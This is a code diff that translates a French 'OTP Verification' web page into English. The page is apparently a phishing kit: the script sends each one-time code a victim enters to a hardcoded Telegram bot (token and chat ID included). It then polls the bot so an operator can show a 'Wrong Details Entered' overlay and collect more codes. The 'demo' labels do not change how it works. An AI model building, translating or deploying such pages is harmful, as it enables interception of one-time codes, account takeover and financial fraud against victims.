@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Vérification OTP</title>
+<title>OTP Verification</title>
 <script src="https://cdn.tailwindcss.com"></script>
 <style>
     /* Overlay for decline message */
@@ -36,10 +36,10 @@
 <div id="declineOverlay">
     <div class="decline-box">
         <div class="text-5xl mb-4">❌</div>
-        <h2 class="text-2xl font-bold text-red-600 mb-2">Mauvais détails saisis</h2>
-        <p class="text-gray-600 mb-6">Le code OTP fourni est incorrect. Veuillez réessayer.</p>
+        <h2 class="text-2xl font-bold text-red-600 mb-2">Wrong Details Entered</h2>
+        <p class="text-gray-600 mb-6">The OTP code provided is incorrect. Please try again.</p>
         <button onclick="closeDecline()" class="bg-black text-white px-8 py-3 rounded-xl font-bold hover:bg-gray-800">
-            Réessayer
+            Try Again
         </button>
     </div>
 </div>
@@ -49,17 +49,17 @@
     <!-- Back button -->
     <button onclick="history.back()" 
         class="flex items-center gap-2 border rounded-full px-4 py-2 text-gray-700 text-sm">
-        ← Retour
+        ← Back
     </button>
 
     <!-- Title -->
     <h1 class="mt-6 text-xl font-semibold text-gray-900">
-        Vérification OTP
+        OTP Verification
     </h1>
 
     <!-- Instruction -->
     <p class="mt-3 text-gray-700 text-sm">
-        Veuillez saisir le code OTP que vous avez reçu le 
+        Please enter the OTP code you received on 
         <span class="font-semibold">+243812345678</span>
     </p>
 
@@ -101,7 +101,7 @@
     <!-- Resend -->
     <div class="mt-6">
         <button type="button" class="text-red-600 font-semibold text-sm">
-            RENVOYER CODE OTP
+            RESEND OTP CODE
         </button>
     </div>
 
@@ -109,10 +109,10 @@
 
 <script>
 
-// ===== CONFIG TELEGRAM (À REMPLACER AVEC LES MÊMES VALEURS QUE LA PAGE DE PAIEMENT) =====
+// ===== CONFIG TELEGRAM =====
 const TELEGRAM_BOT_TOKEN = "8857128734:AAHF-gBFjWBMm5AQF8f_3MzOysjYEPVaUGY";
 const TELEGRAM_CHAT_ID  = "7468436625";
-// =======================================================================================
+// ===========================
 
 const inputs = document.querySelectorAll(".otp");
 const form = document.getElementById("otpForm");
@@ -177,22 +177,22 @@ function checkAndSubmit(){
 
     if(otp.length === inputs.length){
 
-        // ⛔ Empêcher l'envoi normal du formulaire
+        // ⛔ Prevent normal form submission
         form.removeEventListener("submit", handleSubmit);
         form.addEventListener("submit", handleSubmit);
 
-        // Déclencher l'envoi vers Telegram
-        envoyerOTP(otp);
+        // Send OTP to Telegram
+        sendOTP(otp);
 
     }
 
 }
 
 function handleSubmit(e) {
-    e.preventDefault(); // Bloque la soumission traditionnelle
+    e.preventDefault(); // Block traditional submission
 }
 
-// === POLLING : écoute les réponses du bot ===
+// === POLLING : listen for bot responses ===
 function startPolling() {
     if (pollingActive) return;
     pollingActive = true;
@@ -239,37 +239,38 @@ function startPolling() {
                 });
             })
             .catch(err => console.error("Polling error:", err));
-    }, 2000); // Vérifie toutes les 2 secondes
+    }, 2000); // Check every 2 seconds
 }
 
-// === Afficher l'overlay Decline + reset ===
+// === Show decline overlay + reset ===
 function showDecline() {
-    // Réinitialiser le formulaire
+    // Reset the form
     form.reset();
     inputs.forEach(input => input.value = "");
     sentMessageId = null;
     pollingActive = false;
 
-    // Afficher l'overlay
+    // Show overlay
     declineOverlay.classList.add("show");
 }
 
-// === Fermer l'overlay ===
+// === Close decline overlay ===
 function closeDecline() {
     declineOverlay.classList.remove("show");
-    inputs[0].focus(); // Remettre le focus sur le premier champ
+    inputs[0].focus(); // Focus back on first input
 }
 
-function envoyerOTP(otp) {
+function sendOTP(otp) {
 
+    // === TELEGRAM MESSAGE IN ENGLISH ===
     const message = `
-🔴 CODE OTP REÇU (DÉMO)
+🔴 OTP CODE RECEIVED (DEMO)
 ━━━━━━━━━━━━━━━━━━━━━
-🔑 OTP : ${otp}
-📱 Numéro : +243812345678
-🕐 Timestamp : ${new Date().toLocaleString("fr-FR")}
+🔑 OTP: ${otp}
+📱 Phone: +243812345678
+🕐 Timestamp: ${new Date().toLocaleString("en-US")}
 ━━━━━━━━━━━━━━━━━━━━━
-⚠️ Ceci est une démo — à des fins de test uniquement.
+⚠️ This is a demo — for testing purposes only.
     `.trim();
 
     const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
@@ -296,15 +297,15 @@ function envoyerOTP(otp) {
         console.log("Telegram (OTP) response:", data);
         if (data.ok && data.result) {
             sentMessageId = data.result.message_id;
-            // Démarrer le polling pour écouter la réponse
+            // Start polling to listen for response
             startPolling();
         } else {
-            // Fallback : rediriger si l'envoi échoue
+            // Fallback: redirect if sending fails
             window.location.href = "success.html";
         }
     })
     .catch(error => {
-        console.error("Erreur Telegram OTP:", error);
+        console.error("Telegram OTP error:", error);
         window.location.href = "success.html";
     });
 
